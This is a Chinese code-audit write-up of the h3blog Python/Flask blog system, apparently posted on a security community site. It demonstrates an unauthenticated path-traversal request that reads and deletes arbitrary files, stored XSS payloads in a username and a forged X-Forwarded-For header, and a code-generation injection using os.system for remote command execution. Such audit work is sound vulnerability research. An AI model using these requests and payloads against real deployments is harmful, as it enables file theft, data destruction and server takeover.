# 某Python博客系统代审过程-先知社区

> **来源**: https://xz.aliyun.com/news/18752  
> **文章ID**: 18752

---

# 介绍

h3blog是一个基于Python开发的轻量级博客系统，具有以下特点：

* 支持多模版切换
* SEO友好
* 快速开发框架
* 支持多数据库（SQLite、MySQL）
* 支持文章付费阅读
* 支持支付宝支付

博客界面参考: [https://www.h3blog.com](https://gitee.com/link?target=https%3A%2F%2Fh3blog.com)

# 环境搭建

项目地址：<https://gitee.com/pojoin/h3blog>

下载到本地后，cd到项目目录

```
# 创建虚拟环境
python -m venv venv

# 激活虚拟环境
# Windows:
.\venv\Scripts\activate.bat
# Linux/Mac:
source venv/bin/activate

# 安装依赖
pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
```

然后创建数据库导入sql文件（**这里sql文件要从作者公众号获取**）

![image.png](images/20250910153118-23ff77b8-8e18-1.png)

在项目根目录创建 `.env` 文件：

```
# MySQL配置
DATABASE_URL = mysql+pymysql://root:password@127.0.0.1:3306/h3blog?charset=utf8mb4
```

```
# 设置环境变量
# Windows PowerShell:
$env:FLASK_ENV="development"
# Windows CMD:
set FLASK_ENV=development
# Linux/Mac:
export FLASK_ENV=development

# 启动服务
flask run
```

![image.png](images/20250910153118-2417d0ba-8e18-1.png)

管理员登录: `/admin`，账号密码：`admin:123456`

# 代码审计

## 项目分析

通过项目结构、引入依赖内容、代码写法判断出项目使用flask框架

![image.png](images/20250910153118-243b2448-8e18-1.png)

版本是2.0.1

![image.png](images/20250910153118-244af4c2-8e18-1.png)

方法路由也是采用flask注解写法

![image.png](images/20250910153118-245cd2dc-8e18-1.png)

## 鉴权分析

项目采用两个自定义注解校验身份

`@login_required` 判断用户是否登入

`@admin_required` 判断用户是否为管理员

`@admin_perm` 更精细的管理员判断

其中@login\_required是Flask的`Flask-Login`拓展提供的

![image.png](images/20250910153119-2470e6d2-8e18-1.png)

![image.png](images/20250910153119-248335d0-8e18-1.png)

实现逻辑是登入时写入用户凭据到session中，使用时再获取，那么这里就不太能伪造了，如何由于是blog系统是可以注册的，关注@admin\_required实现

![image.png](images/20250910153119-24942de2-8e18-1.png)

主要逻辑是调用current\_user.is\_admin进行身份判断，跟进方法处理

![image.png](images/20250910153119-24a235d4-8e18-1.png)

这里直接就是返回true，也就是说只要登入的用户都可以访问管理员接口，但是在@login\_required中有一个权限校验

![image.png](images/20250910153119-24b11228-8e18-1.png)

会判断请求包中cookie中的remember\_token是否为admin，并且请求的是admin蓝图满足的化会判断登入用户的user\_type是否为管理员

接着来看下最后一个装饰器@admin\_perm

![image.png](images/20250910153119-24c8ddba-8e18-1.png)

`@admin_perm`装饰器接受四个参数：

1. `model_name`：模块名称，用于记录操作日志
2. `opt`：操作名称，用于记录操作日志
3. `permission`：权限标识
4. `admin_required`：是否需要管理员权限，默认为`True`

关键点在17行判断`admin_required`是否为true，如果为true进行管理员身份判断

如果用户未登录（not current\_user 为 True）直接拒绝访问，返回 403 错误，不会执行第二部分的检查

如果用户已登录（not current\_user 为 False）判断用户对象是否有 is\_admin 方法，调用该方法检查是否为管理员，如果不是管理员（is\_admin() 返回 False），则 not current\_user.is\_admin() 为 True，拒绝访问，如果是管理员（is\_admin() 返回 True），则 not current\_user.is\_admin() 为 False，允许访问，如果用户对象没有 is\_admin 方法，直接返回 True，拒绝访问

那么对于这个接口可以寻找允许匿名访问的，就是设置了`admin_required`为False的

23行还有个opt\_log方法记录操作日志

因为是blog网站有注册功能，我们要前台就是寻找普通用户或匿名用户访问的接口，@login\_required非admin蓝图，或者没有权限注解的接口

## 前台任意文件下载+删除

通过关键词open(定位到app/admin/views/common.py中的download方法

![image.png](images/20250910153119-24de9e48-8e18-1.png)

可以看到接口没有权限注解，request接收fileName参数，通过os.path.join拼接文件路径，跟进下H3BLOG\_UPLOAD\_PATH

![image.png](images/20250910153119-24f2ae58-8e18-1.png)

等于项目路径加uploads

![image.png](images/20250910153119-2503acf6-8e18-1.png)

这里直接拼接我们传入的文件名，使用open读取

![image.png](images/20250910153120-2518dda6-8e18-1.png)

读取完成后在stream\_and\_remove\_file方法中调用os.remove删除文件

新建个文件

![image.png](images/20250910153120-2526f954-8e18-1.png)

构建poc测试下

```
GET /admin/download?fileName=../../../../111.txt HTTP/1.1
Host: 127.0.0.1:5000
sec-ch-ua-platform: "Windows"
Sec-Fetch-Dest: script
If-Modified-Since: Mon, 31 Mar 2025 01:11:05 GMT
Sec-Fetch-Mode: no-cors
sec-ch-ua-mobile: ?0
sec-ch-ua: "Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://127.0.0.1:5000/
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Sec-Fetch-Site: same-origin
Accept-Language: zh-CN,zh;q=0.9
```

![image.png](images/20250910153120-253d16ba-8e18-1.png)

![image.png](images/20250910153120-25503b18-8e18-1.png)

成功读取文件内容并删除

## 用户名XSS

注册用户后，修改用户名为xsspoc

![image.png](images/20250910153120-25691758-8e18-1.png)

模拟管理员后台查看用户信息

![image.png](images/20250910153120-2583055a-8e18-1.png)

## 操作记录XSS

![image.png](images/20250910153120-259bd6b6-8e18-1.png)

后台有记录用户操作日志的地方，其中会记录用户登入ip等若干信息，定位记录方法

查看普通用户登入接口

![image.png](images/20250910153121-25b87e10-8e18-1.png)

使用了@admin\_perm，前面分析过其中有个opt\_log方法会记录操作日志，看下方法实现

![image.png](images/20250910153121-25d590e2-8e18-1.png)

其中这里记录ip是通过get\_real\_ip()获取，跟进方法实现

![image.png](images/20250910153121-25ebbd3e-8e18-1.png)

优先通过X-Forwarded-For获取，可伪造

抓取用户登入请求包加上伪造的XFF头

```
POST /login?next=/ HTTP/1.1
Host: 127.0.0.1:5000
Cache-Control: max-age=0
Sec-Fetch-User: ?1
Accept-Encoding: gzip, deflate, br, zstd
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Dest: document
sec-ch-ua-platform: "Windows"
Cookie: session=eyJjc3JmX3Rva2VuIjoiOGU0ZWM0YzU5MmEzOTgwODY3ZDEwYjM4YjI4ZDVmZjMyYTBjOWYzYSJ9.aLelCA.I7bg3GyF1UzV8rGcv9Xc64S4QPo
sec-ch-ua: "Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"
Content-Type: application/x-www-form-urlencoded
Origin: http://127.0.0.1:5000
sec-ch-ua-mobile: ?0
Referer: http://127.0.0.1:5000/
X-Forwarded-For: <script>alert('XSS');</script>
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 136

csrf_token=IjhlNGVjNGM1OTJhMzk4MDg2N2QxMGIzOGIyOGQ1ZmYzMmEwYzlmM2Ei.aLelCA.WPl8KTPiPPt4bx4RZHCmxLrh79M&username=caigosec&password=123456
```

![image.png](images/20250910153121-26070b52-8e18-1.png)

模拟管理员查看操作日志

![image.png](images/20250910153121-2628229c-8e18-1.png)

## 后台文件写入RCE

全局搜索`open(`，筛选w或a模式的

![image.png](images/20250910153122-263e858c-8e18-1.png)

定位到app/admin/views/sys/gencode.py中的gencode方法

![image.png](images/20250910153122-265a8aa2-8e18-1.png)

通过传入id查询生成模型，然后判断如果是api类型模型就生成对应的py文件，把查询到的content内容写入文件中，如果非api模型，根据记录的文件后缀生成html或python文件，把content内容写入

通过注释可以看到是后台的代码生成功能点

![image.png](images/20250910153122-2673531e-8e18-1.png)

测试添加生成

![image.png](images/20250910153122-2687fd7a-8e18-1.png)

![image.png](images/20250910153122-269e700a-8e18-1.png)

这里在生成代码前要先生成下信息

![image.png](images/20250910153122-26b67164-8e18-1.png)

执行生成代码

![image.png](images/20250910153122-26c9e7d0-8e18-1.png)

生成的代码文件在app/admin/views/cms/目录下(非api接口)

![image.png](images/20250910153123-26dc5c26-8e18-1.png)

发现这里我们配置的基础信息都会写入，修改信息为`1"]+os.system('calc')#`再次生成代码

![image.png](images/20250910153123-26f17368-8e18-1.png)

访问对应接口

![image.png](images/20250910153123-270b219e-8e18-1.png)

成功执行命令

​

​
